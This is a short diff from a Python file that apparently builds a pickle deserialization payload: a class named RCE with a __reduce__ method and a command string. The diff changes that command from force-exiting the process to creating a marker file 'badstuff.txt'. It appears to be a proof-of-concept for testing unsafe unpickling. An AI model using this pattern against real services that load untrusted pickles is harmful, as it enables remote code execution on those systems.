@@ -2,7 +2,7 @@ import pickle
 import sys
 import base64
 
-PYTHON_COMMAND = '''python -c 'print("bad stuff"); print("before exit"); import sys; import os; sys.exit(os._exit());' '''
+PYTHON_COMMAND = '''python -c 'print("bad stuff"); from pathlib import Path; Path("badstuff.txt").touch();' '''
 
 class RCE(object):
     def __reduce__(self):
